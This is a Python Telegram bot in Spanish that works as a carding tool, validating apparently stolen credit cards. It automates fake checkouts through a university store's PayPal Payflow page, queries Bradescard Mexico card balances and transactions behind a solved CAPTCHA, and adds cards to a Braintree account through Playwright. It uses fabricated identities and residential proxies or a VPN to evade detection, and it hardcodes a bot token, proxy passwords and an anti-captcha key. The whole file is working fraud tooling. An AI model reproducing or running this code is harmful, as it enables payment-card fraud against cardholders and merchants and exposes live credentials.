import random
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters
from curl_cffi import requests
from tools import Tools
import threading
from playwright.async_api import async_playwright
from telegram import Update
from telegram.ext import Application, MessageHandler, filters, CallbackContext
from faker import Faker
import random
fake = Faker()
import globals
TOKEN_ID = "8100331928:AAGO6_xdpBxx2h4zbjNmx9Sin0QLb9PHhzA"
TELEGRAM_API_URL = f"https://api.telegram.org/bot{TOKEN_ID}/sendMessage"

class PayMyFlow:
    @staticmethod
    def pc(card):
        username = "customer-aleqg_BS2jE-cc-mx-city-mexico_city"
        password = "Saiper_123"
        PROXY_DNS = "pr.oxylabs.io:7777"
        proxys = {"http":"http://{}:{}@{}".format(username, password, PROXY_DNS)}
        proxy = {
        "server": "https://network.joinmassive.com:65535",
        "username": "mpuudKz0Oo-country-MX-city-Ciudad%20De%20Mexico%20-zipcode-77086-device-common",
        "password": "6Tv9oa17WbOsBNDjStmF"
        }
        session = requests.Session(impersonate='chrome123')
        session.verify = False
        try:
            cc, mes, ano, cvv = card.split('|')
        except ValueError:
            raise ValueError(f"Formato inválido para la tarjeta: {card}. Se esperaba 'CC|MES|AÑO|CVV'.")
        
        req = session.get("https://www.owp.csus.edu/cart/add-product.php?id=210", proxies=proxy)
        tags = Tools.getInputTags(req.text)

        req = session.post(
            "https://www.owp.csus.edu/cart/add-product.php",
            data={
                'id': '210',
                'frmtoken': tags['frmtoken'],
                'fee14600': '1',
            }, proxies=proxy
        )

        req = session.get("https://www.owp.csus.edu/checkout/index.php", proxies=proxy)
        tags = Tools.getInputTags(req.text)

        fake = Tools.fakeData()
        while fake.get("state") == "TX":
            fake = Tools.fakeData()

        req = session.post(
            "https://www.owp.csus.edu/checkout/index.php",
            data={
                'frmtoken': tags['frmtoken'],
                'first_name': fake['name'],
                'last_name': fake['last'],
                'email': fake['email'],
                'address_type': 'residential',
                'ship_attention_to': '',
                'ship_street_1': fake['street'],
                'ship_street_2': '',
                'ship_city': fake['city'],
                'ship_state': fake['state'],
                'ship_postal_code': fake['zip'],
                'ship_country': '1',
                'ship_phone_country': '1',
                'ship_phone_area_code': str(random.randint(100, 999)),
                'ship_phone_local': str(random.randint(1000000, 9999999)),
                'ship_phone_extension': '',
                'use_ship_address': '1',
                'bill_attention_to': '',
                'bill_street_1': fake['street'],
                'bill_street_2': '',
                'bill_city': fake['city'],
                'bill_state': fake['state'],
                'bill_postal_code': fake['zip'],
                'bill_country': '1',
                'bill_phone_country': '1',
                'bill_phone_area_code': str(random.randint(100, 999)),
                'bill_phone_local': str(random.randint(1000000, 9999999)),
                'bill_phone_extension': '',
            }, proxies=proxy
        )

        tags = Tools.getInputTags(req.text)

        req = session.post(
            "https://www.owp.csus.edu/checkout/checkout2.php",
            data={
                'frmtoken': tags['frmtoken'],
                'shipopt': '03',
                'billed_as': '1',
                'refund_agree': '1',
            }, proxies=proxy
        )

        pf = Tools.getInputTags(Tools.parseString(req.text, '<form id="online"', '</form'))

        req = session.post(
            "https://payflowlink.paypal.com/",
            data={
                'SECURETOKEN': pf['SECURETOKEN'],
                'SECURETOKENID': pf['SECURETOKENID'],
                'g-recaptcha-response': '',
            }, proxies=proxy
        )

        tags = Tools.getInputTags(req.text)

        req = session.post(
            "https://payflowlink.paypal.com/processTransaction.do",
            data={
                'subaction': '',
                'CARDNUM': cc,
                'EXPMONTH': mes,
                'EXPYEAR': ano[-2:],
                'CVV2': cvv,
                'startdate_month': '',
                'startdate_year': '',
                'issue_number': '',
                'first_name': fake['name'],
                'last_name': fake['last'],
                'COUNTRY': 'US',
                'billingAddress1': fake['street'],
                'billingAddress2': '',
                'billingCity': fake['city'],
                'billingState': fake['state'],
                'billingZip': fake['zip'],
                'PHONE': f"{fake['phone'][:3]}-{fake['phone'][3:6]}-{fake['phone'][6:]}",
                'EMAIL': fake['email'],
                'shippingPhone': '',
                'shippingEmail': '',
                'METHOD': 'C',
                'TYPE': 'S',
                'PAYMETHOD': 'C',
                'SHIPAMOUNT': '0.00',
                'TAX': '0.00',
                'INVOICE': tags['INVOICE'],
                'COMMENT1': tags['COMMENT1'],
                'USER1': tags['USER1'],
                'USER2': tags['USER2'],
                'flag3dSecure': '',
                'CURRENCY': 'USD',
                'STATE': fake['state'],
                'SECURETOKEN': tags['SECURETOKEN'],
                'SECURETOKENID': tags['SECURETOKENID'],
                'PARMLIST': '',
                'MODE': '',
                'CSRF_TOKEN': tags['CSRF_TOKEN'],
                'referringTemplate': 'templateb',
            }, proxies=proxy
        )

        data = Tools.getInputTags(req.text)

        response = {}
        response = {
            "result": data.get("EXTRSPMSG") or data.get("RESPMSG") or "⚠️ Error inesperado, contacta a un administrador."
        }

        if "PROCAVS" in data and "CVV2MATCH" in data:
            avs_status = data["PROCAVS"]
            cvv_status = data["CVV2MATCH"]

            avs_dict = {
                "Y": "✅ Dirección y código postal coinciden",
                "N": "❌ No coincide",
                "A": "⚠️ Solo la dirección coincide",
                "Z": "⚠️ Solo el código postal coincide"
            }
            
            cvv_dict = {
                "M": "✅ CVV correcto",
                "N": "❌ CVV incorrecto",
                "P": "⚠️ CVV no procesado",
                "S": "⚠️ Emisor no proporciona verificación de CVV"
            }

            response["additional_info"] = {
                "CVV": cvv_dict.get(cvv_status, f"🔍 Código desconocido ({cvv_status})"),
                "AVS": avs_dict.get(avs_status, f"🔍 Código desconocido ({avs_status})")
            }

        # Formatear la respuesta como mensaje de texto
        mensaje = f"💳 **Resultado de la Tarjeta**\n"
        mensaje += f"📝 *Estado:* `{response['result']}`\n"

        if "additional_info" in response:
            mensaje += f"\n🔍 **Verificación de Seguridad**\n"
            mensaje += f"🔹 *CVV:* {response['additional_info']['CVV']}\n"
            mensaje += f"🔹 *AVS:* {response['additional_info']['AVS']}\n"

        return mensaje


from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext,ContextTypes
import subprocess

# Configuración
VPN_INTERFACE = "wg0"  # Cambia a "wg0" si usas WireGuard, o "surfshark" para OpenVPN
OVPN_FILE = "/etc/openvpn/surfshark.ovpn"  # Cambia según tu configuración

async def get_ip():
    """Obtiene la IP pública después de conectarse a la VPN."""
    process = subprocess.run(["curl", "-s", "ifconfig.me"], capture_output=True, text=True)
    return process.stdout.strip()

async def is_vpn_active():
    """Verifica si la VPN ya está activa revisando la interfaz wg0."""
    process = subprocess.run(["ip", "link", "show", "wg0"], capture_output=True, text=True)
    return process.returncode == 0  # Si el código es 0, la VPN ya está activa

async def connect_vpn(update: Update, context):
    if await is_vpn_active():
        current_ip = await get_ip()
        await update.message.reply_text(f"✅ VPN ya estaba conectada\n\n🌍 IP actual: {current_ip}")
        return

    await update.message.reply_text("🔄 Conectando a Surfshark...")

    process = subprocess.run(["sudo", "wg-quick", "up", "wg0"], capture_output=True, text=True)
    
    if process.returncode == 0:
        new_ip = await get_ip()
        await update.message.reply_text(f"✅ VPN conectada\n\n🌍 Nueva IP: {new_ip}")
    else:
        await update.message.reply_text(f"⚠️ Error al conectar VPN\n\n{process.stderr}")

async def disconnect_vpn(update: Update, context):
    if not await is_vpn_active():
        await update.message.reply_text("❌ VPN ya estaba desconectada.")
        return

    await update.message.reply_text("🔄 Desconectando Surfshark...")

    process = subprocess.run(["sudo", "wg-quick", "down", "wg0"], capture_output=True, text=True)
    
    if process.returncode == 0:
        original_ip = await get_ip()
        await update.message.reply_text(f"❌ VPN desconectada\n\n🌍 IP original: {original_ip}")
    else:
        await update.message.reply_text(f"⚠️ Error al desconectar VPN\n\n{process.stderr}")

async def get_ip():
    """Obtiene la dirección IP pública actual."""
    try:
        response = requests.get("https://api64.ipify.org?format=json", timeout=5)
        return response.json().get("ip", "No se pudo obtener la IP")
    except requests.RequestException:
        return "Error al obtener la IP"

async def is_internet_available():
    """Verifica si hay conexión a Internet."""
    try:
        requests.get("https://www.google.com", timeout=5)
        return True
    except requests.RequestException:
        return False

async def reconnect_vpn(update: Update, context: CallbackContext):
    """Comando /reconectar: reinicia la VPN y muestra la nueva IP."""
    await update.message.reply_text("🔄 Reconectando la VPN...")

    # Apagar la VPN
    subprocess.run(["sudo", "wg-quick", "down", "wg0"], capture_output=True, text=True)
    await asyncio.sleep(3)  # Esperar a que se apague completamente

    # Encender la VPN
    process = subprocess.run(["sudo", "wg-quick", "up", "wg0"], capture_output=True, text=True)

    if process.returncode == 0:
        await asyncio.sleep(5)  # Esperar para estabilizar la conexión

        if await is_internet_available():
            new_ip = await get_ip()
            await update.message.reply_text(f"✅ VPN reconectada con éxito\n\n🌍 Nueva IP: {new_ip}")
        else:
            await update.message.reply_text("⚠️ VPN conectada, pero no hay conexión a Internet.")
    else:
        await update.message.reply_text(f"⚠️ Error al reconectar la VPN\n\n{process.stderr}")

import asyncio
import json
import requests
import re
from concurrent.futures import ThreadPoolExecutor

# Para refactorizar contenido
def procesar_contenido1(contenido):
    KEYS = "/#%&()=?¿!¡*[]{}-_.:,;|@+"
    for KEY in KEYS:
        contenido = contenido.replace(KEY, "|").replace(" ", "|")
    
    match = re.search(r'\d{16}', contenido)
    if not match:
        return None
    else:
        cc_number = match.group()  # Extraer los primeros 16 dígitos
        return cc_number

# Resolver Captcha de forma asincrónica
async def resolver_captcha(api_key, sitekey, url):
    data = {
        'clientKey': api_key,
        'task': {
            'type': 'NoCaptchaTaskProxyless',
            'websiteURL': url,
            'websiteKey': sitekey
        }
    }
    try:
        response = await asyncio.to_thread(requests.post, 'http://api.anti-captcha.com/createTask', json=data)
        result = response.json()

        if 'errorId' in result and result['errorId'] == 0:
            task_id = result['taskId']
            
            # Esperar a que se resuelva el captcha
            while True:
                await asyncio.sleep(5)
                response = await asyncio.to_thread(requests.post, 'http://api.anti-captcha.com/getTaskResult', json={'clientKey': api_key, 'taskId': task_id})
                if response.json()['status'] == 'ready':
                    return response.json()['solution']['gRecaptchaResponse']
        else:
            raise Exception('Error en la API de anti-captcha')

    except Exception as e:
        raise Exception(f'Error al resolver el captcha: {str(e)}')

# Función principal para procesar la tarjeta
import asyncio
import requests
import re
import json

async def brades(datos, chat_id):
    anti_captcha_api_key = 'fbcc854191b4698513a0517c6d2487ef'
    sitekey = '6LdehgAVAAAAACpQnwTNpuZOiuyJfUg4Ug-9Tvjn'
    url_destino = 'https://www.bradescard.com.mx/bradescard.site/pago/index.html?v=0.0.3'
    if isinstance(datos, list) and len(datos) == 4:
        cc_number, mes, ano, cvv = datos
    else:
        raise ValueError(f"Formato incorrecto de datos: {datos}")
    

    try:
        # Resolver CAPTCHA
        anticapt = await resolver_captcha(anti_captcha_api_key, sitekey, url_destino)

        s = requests.Session()
        
        # Enviar solicitud de verificación de tarjeta
        try:
            response = await asyncio.to_thread(s.post, 'https://www.bradescard.com.mx/bradescard.net/Home/VerificaTarjeta', data={
                "token": anticapt,
                "tarjeta": cc_number,
                "terminos": True
            }, headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
                "Origin": "https://www.bradescard.com.mx",
                "Referer": "https://www.bradescard.com.mx/bradescard.site/pago/index.html?v=0.0.3",
            })
        except Exception as e:
            return f"⚠️ Error en la solicitud de verificación de tarjeta: {str(e)}"

        if "No se pudo verificar la tarjeta" in response.text or "success\":false" in response.text:
            return "🚫 No se pudo verificar la tarjeta. Intenta más tarde."

        # Obtener número de tarjeta del cliente
        try:
            response = await asyncio.to_thread(s.get, 'https://www.bradescard.com.mx/bradescard.net/', headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
                "Referer": "https://www.bradescard.com.mx/bradescard.site/pago/index.html?v=0.0.3",
            })
            numerotarjetacliente = re.search(r"numerotarjetacliente: '([^']+)'", response.text)
            numerotarjetacliente = numerotarjetacliente.group(1) if numerotarjetacliente else "Desconocido"
        except Exception as e:
            return f"⚠️ Error al obtener número de tarjeta: {str(e)}"

        # Consultar detalles de tarjeta
        try:
            response = await asyncio.to_thread(s.post, "https://www.bradescard.com.mx/bradescard.net/MasterPage/consultaResumenMovimientosPagoLinea", params={
                "numerotarjetacliente": numerotarjetacliente,
            }, headers={
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Origin": "https://www.bradescard.com.mx",
                "Referer": "https://www.bradescard.com.mx/bradescard.net/",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
                "X-Requested-With": "XMLHttpRequest"
            })
            card_data = response.json()
        except Exception as e:
            return f"⚠️ Error al obtener datos de la tarjeta: {str(e)}"

        # Extraer datos con valores predeterminados
        disponible_compras = card_data.get("DisponibleComprasPersona", "No disponible")
        pago_minimo = card_data.get("PagoMinimoPersona", "No disponible")
        saldo_total = card_data.get("SaldoTotalPersona", "No disponible")
        pago_total_mes = card_data.get("PagoTotalMesPersona", "No disponible")
        limite_credito = card_data.get("LimiteCreditoPersona", "No disponible")
        fecha_limite_pago = card_data.get("FechaLimitePagoPersona", "No disponible")
        fecha_corte = card_data.get("FechaCortePersona", "No disponible")

        # Consultar movimientos antes de corte
        try:
            response = await asyncio.to_thread(s.post, "https://www.bradescard.com.mx/bradescard.net/MasterPage/ConsultaDatosMovimientosAntesCorte", data={
                "NumeroTarjeta": numerotarjetacliente, "periodo": "0"
            }, headers={
                "Host": "www.bradescard.com.mx",
                "Origin": "https://www.bradescard.com.mx/",
                "Referer": "https://www.bradescard.com.mx/bradescard.net/",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            })
            card_data = response.json()
        except Exception as e:
            return f"⚠️ Error al obtener movimientos: {str(e)}"

        # Procesar movimientos
        movimientos_output = ""
        if not card_data.get('status', True):
            movimientos_output = "🚫 No existen movimientos registrados."
        else:
            movimientos = json.loads(card_data.get("movimientos", "[]"))
            if not movimientos:
                movimientos_output = "🚫 No existen movimientos registrados."
            else:
                for item in movimientos:
                    if 'FechaRegistro' in item:
                        movimientos_output += f"📅 Fecha: {item['FechaRegistro']}\n💰 Monto: ${item['Monto']} MXN\n📌 Descripción: {item['Descripcion']}\n"
                        movimientos_output += "━━━━━━━━━━━━━━\n"

        # Formatear respuesta final
        result = f'''
💳 Tarjeta ➜ {cc_number+"|"+mes+"|"+ano+"|"+cvv} 
💰 Pago Mínimo ➜ {pago_minimo}  
📅 Pago Del Mes ➜ {pago_total_mes}  
💵 Total/Pago ➜ {saldo_total}  
💳 Límite de Crédito ➜ {limite_credito}  
⏳ Fecha Límite Pago ➜ {fecha_limite_pago}  
📆 Fecha de Corte ➜ {fecha_corte}  
🛒 Disponible para Compras ➜ {disponible_compras}  

━━━━━ Movimientos ━━━━━\n{movimientos_output}
'''
        return result

    except Exception as e:
        return f'❌ Error inesperado: {str(e)}'
    

async def async_playwright_functionauth(card_data, telegram_chat_id):
    cc, mes, ano, cvv = card_data
    
    proxy = {
        "server": "https://network.joinmassive.com:65535",
        "username": "mpuudKz0Oo-country-MX-city-Ciudad%20De%20Mexico%20-zipcode-77086-device-common",
        "password": "6Tv9oa17WbOsBNDjStmF"
    }

    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=False, proxy=proxy)

        context = await browser.new_context()
        page = await context.new_page()

        try:
            await page.goto("http://ip-api.com/json")
            content = await page.content()
            print(content)  # Aquí puedes parsear la respuesta JSON si necesitas
        except Exception as e:
            print(f"Error: {e}")
        await page.goto(globals.urlauth)
        

        try:
            # Generación de datos
            apellido = fake.last_name()
            nombre = "andres" + str(apellido)
            co = '958' + str(random.randint(0, 9999)) + '@gmail.com'
            num = random.randint(0, 999)
            correo = f"{num}{apellido}{num}{co}"
            em = f"{nombre}{apellido}{str(random.randint(0, 9999))}@gmail.com"
            cn = f"{apellido} {nombre}"

            await page.wait_for_timeout(7000)

            try:
                
                await page.get_by_role("link", name="Create an account").click()
                await page.wait_for_timeout(2000)
                await page.get_by_label("Full Name").click()
                await page.get_by_label("Full Name").type(nombre+" "+apellido,delay=100)
                await page.wait_for_timeout(1000)
                await page.get_by_label("Email").click()
                await page.get_by_label("Email").type(em,delay=100)
                await page.wait_for_timeout(1000)
                await page.get_by_label("Password", exact=True).click()
                await page.get_by_label("Password", exact=True).type("saiper123",delay=100)
                await page.wait_for_timeout(1000)
                await page.get_by_label("Confirm Password").click()
                await page.get_by_label("Confirm Password").type("saiper123",delay=100)
                await page.wait_for_timeout(1000)
                await page.get_by_role("button", name="Create an account").click()
                await page.wait_for_timeout(5000)
                await page.get_by_role("link", name="Manage Addresses").click()
                await page.wait_for_timeout(5000)
                await page.get_by_text("Add an address").click()
                await page.wait_for_timeout(1000)
                await page.get_by_label("Country").select_option("156")
                await page.wait_for_timeout(1000)
                await page.get_by_placeholder("Street address or P.O. box").click()
                await page.get_by_placeholder("Street address or P.O. box").type("calle "+str(num))
                await page.wait_for_timeout(1000)
                await page.get_by_label("City").click()
                await page.get_by_label("City").type("tekax",delay=100)
                await page.wait_for_timeout(1000)
                await page.get_by_label("State").select_option("515")
                await page.wait_for_timeout(1000)
                await page.get_by_label("Zip code").click()
                await page.get_by_label("Zip code").type("97"+str(num),delay=100)
                await page.wait_for_timeout(1000)
                await page.get_by_role("button", name="Save Address").click()
                await page.wait_for_timeout(1000)
                await page.get_by_role("button", name="Save as Entered").click()
                await page.wait_for_timeout(1000)
                await page.get_by_role("link", name="Account", exact=True).click()
                await page.wait_for_timeout(5000)
                await page.get_by_role("link", name="Manage Payments").click()
                await page.wait_for_timeout(3000)
                await page.get_by_text("Add a payment method").click()
                await page.wait_for_timeout(1000)
                await page.get_by_text("credit_cardCredit Card").click()
                await page.wait_for_timeout(1000)

                iframe_locator = page.frame_locator("#braintree-hosted-field-number")

                # Acceder al input dentro del iframe y rellenarlo con el número de tarjeta
                await iframe_locator.locator("input[name='credit-card-number']").type(cc,delay=100)  # Tarjeta de prueba VISA

                print("Número de tarjeta rellenado exitosamente.")
                await page.wait_for_timeout(1000)
                
                # Esperar que el iframe de Braintree esté presente
                iframe_locator = page.frame_locator("#braintree-hosted-field-expirationDate")

                # Acceder al input dentro del iframe y llenar la fecha de expiración
                await iframe_locator.locator("input[name='expiration']").type( f"{mes}/{ano[-2:]}",delay=100)  # Fecha de expiración de prueba

                print("Fecha de expiración rellenada exitosamente.")
                await page.wait_for_timeout(1000)
                iframe_locator = page.frame_locator("#braintree-hosted-field-cvv")

                # Acceder al input dentro del iframe y llenar el CVV
                await iframe_locator.locator("input[name='cvv']").type(cvv,delay=100)  # CVV de prueba

                print("CVV rellenado exitosamente.")



                await page.get_by_text("radio_button_unchecked").click()
                await page.wait_for_timeout(1000)
                await page.get_by_role("button", name="Save Card").click()
                await page.wait_for_timeout(7000)
                try:
                    # Esperar hasta que aparezca un mensaje de error (ajusta el selector si es necesario)
                    error_selector = "div[class*='Alert_error']"  # Selector basado en la clase común
                    await page.wait_for_selector(error_selector, timeout=5000)  # Espera hasta 5 segundos

                    # Obtener y mostrar el mensaje de error
                    error_text = await page.locator(error_selector).inner_text()
                    status_message=error_text
                    print(f"❌ Error detectado: {error_text}")

                except Exception as e:
                    status_message="ADDED CARD ✅"
                    print("✅ No se detectaron errores de pago.")



                
                
            except Exception as e:
                print(f"Error: {str(e)}")


            
            


           

            # Imprimir el resultado final
            print(status_message)
  

             # Enviar resultado al chat de Telegram
            respuesta = f"𝗖𝗰 :{cc}|{mes}|{ano}|{cvv}\n 𝑹𝑬𝑺𝑷𝑶𝑵𝑺𝑬 : {status_message}\n────────────"
            print(f"Resultado: {respuesta}")
        
            await browser.close()
            return f"𝗖𝗰 :{cc}|{mes}|{ano}|{cvv}\n𝑹𝑬𝑺𝑷𝑶𝑵𝑺𝑬 : {status_message}\n────────────"
        except Exception as e:
                status_message="No se pudo prosesar la tarejta"
                respuesta = f"𝗖𝗰 :{cc}|{mes}|{ano}|{cvv}\n 𝑹𝑬𝑺𝑷𝑶𝑵𝑺𝑬 : {status_message}\n────────────"
                print(f"Error: {respuesta}")
                await browser.close()
                return respuesta



funciones_playwright = {
    
    "bra": brades,
    "auth":async_playwright_functionauth
    
    
}
import asyncio
from telegram import Update
from telegram.ext import CallbackContext
from telegram.helpers import escape_markdown
GROUP_CHAT_ID = 846983753




async def b3(update: Update, context: CallbackContext):
    group_chat_id = 846983753  # Reemplaza con el ID del grupo donde quieres enviar los resultados

    # Obtener las tarjetas del mensaje separadas por espacio
    cards = context.args  

    if not cards:
        await update.message.reply_text(
            "⚠️ Por favor, envía entre 1 y 5 tarjetas en el formato:\n"
            "`CC|MES|AÑO|CVV`\n\nEjemplo:\n`/b3 4152313959165486|10|2027|448 4152313959165487|11|2028|123`",
            parse_mode="Markdown"
        )
        return

    if len(cards) > 10:
        await update.message.reply_text("🚫 Solo puedes enviar un máximo de *5 tarjetas* por mensaje.", parse_mode="Markdown")
        return

    # Enviar mensaje inicial de "procesando"
    processing_message = await update.message.reply_text("🔄 Procesando las tarjetas...")

    payflow = PayMyFlow()  # Instancia de la clase (si es necesario)
    results = []

    for card in cards:
        try:
            # Si payflow.pc() es async, usa `await`, de lo contrario, ejecútalo normalmente
            result = await payflow.pc(card) if callable(getattr(payflow.pc, "__await__", None)) else payflow.pc(card)
            results.append(f"✅ CC: `{card}` → {result}")
        except ValueError as e:
            results.append(f"❌ CC: `{card}` → Error: {str(e)}")

    # Formatear el mensaje final
    final_message = "💳 **Resultados del procesamiento:**\n\n" + "\n".join(results)

    # Editar el mensaje de procesamiento con los resultados
    await processing_message.edit_text(final_message, parse_mode="Markdown")

    # Enviar los resultados al grupo
    await context.bot.send_message(chat_id=group_chat_id, text=final_message, parse_mode="Markdown")

import re
import datetime
from telegram import Update
from telegram.ext import CallbackContext

async def extraer_tarjetas(update: Update, context: CallbackContext):
    """Extrae todas las tarjetas en formato CC|MES|AÑO|CVV y elimina las vencidas, permitiendo las del mes actual."""

    if not context.args:
        await update.message.reply_text("⚠️ Debes proporcionar un texto con las tarjetas. Ejemplo:\n`/cc 4169161432096914|12|2028|199`", parse_mode="Markdown")
        return

    # Obtener el mensaje enviado después de /cc
    texto = " ".join(context.args)

    # Expresión regular para detectar tarjetas en formato XXXX|XX|XXXX|XXX
    patron = re.compile(r"(\d{13,16})\|(\d{2})\|(\d{4})\|(\d{3,4})")

    # Obtener la fecha actual
    ahora = datetime.datetime.now()
    mes_actual = int(ahora.strftime("%m"))
    anio_actual = int(ahora.strftime("%Y"))

    # Filtrar solo las tarjetas que NO están vencidas o que son del mes/año actual
    tarjetas_validas = []

    for cc, mes, ano, cvv in patron.findall(texto):
        mes = int(mes)
        ano = int(ano)

        # Verifica si la tarjeta sigue vigente o es del mes/año actual
        if (ano > anio_actual) or (ano == anio_actual and mes >= mes_actual):
            tarjetas_validas.append(f"{cc}|{mes:02d}|{ano}|{cvv}")  # Asegura que el mes tenga 2 dígitos

    # Responder con las tarjetas válidas
    if tarjetas_validas:
        resultado = "\n".join(tarjetas_validas)
        await update.message.reply_text(f"✅ Tarjetas válidas:\n\n{resultado}")
    else:
        await update.message.reply_text("⚠️ No se encontraron tarjetas vigentes en el mensaje.")
# Procesar tarjetas en un hilo separado
IDMASS_FILE = "idmass.txt"

def verificar_id_mass(chat_id):
    """Verifica si el usuario está autorizado para Mass Mode"""
    try:
        with open(IDMASS_FILE, "r") as f:
            ids_autorizados = {line.strip() for line in f}  # Usamos un set para búsqueda rápida
        return str(chat_id) in ids_autorizados
    except FileNotFoundError:
        return False  # Si el archivo no existe, nadie está autorizado


async def procesar_tarjetas(cc_numbers, chat_id, funcion_async, message_id):
    tasks = []
    
    for cc in cc_numbers:
        datos = cc.split("|")
        if len(datos) == 4:  # Validamos que sean 4 partes antes de ejecutar
            tasks.append(funcion_async(datos, chat_id))
        else:
            print(f"❌ Formato incorrecto: {cc}")  # Debugging

    if tasks:
        resultados = await asyncio.gather(*tasks)

        mensaje = "\n".join(resultados)
        
        # Actualizar el mensaje original en lugar de enviar uno nuevo
        requests.get(f"https://api.telegram.org/bot{TOKEN_ID}/editMessageText", params={
            "chat_id": chat_id,
            "message_id": message_id,
            "parse_mode": "Markdown",
            "text": mensaje
        })
        GRUPO_CHAT_ID = -4669383983  # Reemplaza con el ID real del grupo
        requests.get(TELEGRAM_API_URL, params={"chat_id": GRUPO_CHAT_ID, "parse_mode": "Markdown", "text": mensaje})


# Procesar tarjetas en un hilo separado
def process_cards_in_thread(cards, chat_id, funcion_async, message_id):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(procesar_tarjetas(cards, chat_id, funcion_async, message_id))
    loop.close()


# Manejo de comandos dinámicamente
from telegram.ext import Application, CommandHandler

async def ejecutar_verificacion(update: Update, context: CallbackContext):
    comando = update.message.text.split()[0][1:]  # Extrae el comando sin "/"
    chat_id = update.message.chat_id
    tarjetas = context.args

    if not tarjetas:
        await update.message.reply_text(
            "⚠️ Debes proporcionar las tarjetas en este formato:\n"
            "`1234567890123456|12|2025|123`",
            parse_mode="Markdown"
        )
        return

    autorizado_mass = verificar_id_mass(chat_id)

    if len(tarjetas) > 1 and not autorizado_mass:
        await update.message.reply_text("🚫 No estás autorizado para *Mass Mode*. Solo puedes procesar una tarjeta.", parse_mode="Markdown")
        return

    if comando in funciones_playwright:
        funcion_async = funciones_playwright[comando]

        # Enviar mensaje inicial y obtener el ID
        mensaje_inicial = await update.message.reply_text(f"✅ Procesando las tarjetas con el método `{comando}`...")
        message_id = mensaje_inicial.message_id

        # Ejecuta en un hilo separado
        thread = threading.Thread(target=process_cards_in_thread, args=(tarjetas, chat_id, funcion_async, message_id))
        thread.start()

    else:
        await update.message.reply_text(f"❌ Nmms, el comando `{comando}` ni existe 😭\n\n🔹 Usa /help para ver la lista de comandos disponibles.", parse_mode="Markdown")




async def start(update: Update, context):
    await update.message.reply_text("¡Hola! Usa el comando /b3 seguido de las tarjetas para procesarlas.")

def main():
    # Configuración del bot
    application = Application.builder().token("8100331928:AAGO6_xdpBxx2h4zbjNmx9Sin0QLb9PHhzA").build()
    
    # Comandos
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("cc", b3))  # Comando /b3
    #application.add_handler(CommandHandler("c", pay))
    application.add_handler(CommandHandler("reconectar", reconnect_vpn))
    comandos_validos = ["ev", "pay", "jp", "auth", "ad", "d", "au", "mp", "es", "bra","ro","co","b3","ck","a"]

    for cmd in comandos_validos:
        application.add_handler(CommandHandler(cmd, ejecutar_verificacion))
    

    application.add_handler(CommandHandler("conectar", connect_vpn))
    application.add_handler(CommandHandler("desconectar", disconnect_vpn))
   
    
    # Iniciar el bot
    application.run_polling()

if __name__ == '__main__':
    main()
